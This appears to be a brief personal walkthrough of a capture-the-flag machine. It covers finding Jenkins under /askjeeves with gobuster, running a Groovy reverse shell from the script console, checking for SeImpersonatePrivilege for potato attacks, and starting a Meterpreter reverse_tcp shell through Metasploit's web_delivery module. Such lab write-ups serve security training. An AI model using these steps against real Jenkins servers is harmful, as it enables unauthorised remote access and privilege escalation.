Groovy Reverse Shell - [https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)

Run *gobuster* on port 50000.
This will find the path */askjeeves*
There is jenkins under that path.
Open the scrip console and use a Groovy script to pop a shell

1) check user priv => SeImpersonatePrivilege is enabled
2) run the cmd *systeminfo*, save the output to a file and feed that file to **Windows Exploit Suggester** (which will show the potato attacks)

# Optional: spawn meterpreter shell

In order to get a meterpreter shell on the system we can do the following:

Use the metasploit module: **multi/script/web_delivery**

Set target to PowerShell (i.e. how the meterpreter payload is executed). Set payload:
```msfconsole
set target PSH
set payload windows/meterpreter/reverse_tcp
```

When we run the exploit the module will output a command string:
![[Pasted image 20240417090305.png]]

We can just copy this command string and execute it in our simple CMD shell.

In the meterpreter shell we can run:
- `getprivs`
- `run post/multi/recon/local_exploit_suggester`